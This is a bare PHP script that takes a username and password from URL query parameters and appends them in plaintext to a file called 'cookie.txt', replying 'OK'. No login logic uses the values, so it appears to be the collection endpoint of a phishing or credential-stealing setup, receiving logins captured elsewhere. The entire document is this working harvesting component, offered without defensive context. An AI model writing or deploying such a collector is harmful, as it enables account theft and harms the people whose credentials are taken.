<?php
    $username = "";
    $password = "";
    if(isset($_GET["username"]))    $username = $_GET["username"];
    if(isset($_GET["password"]))    $password = $_GET["password"];
    if($username!="" && $password!=""){
        file_put_contents("cookie.txt",$username.",".$password."\n",FILE_APPEND);
        echo 'OK';
    }
        
?>
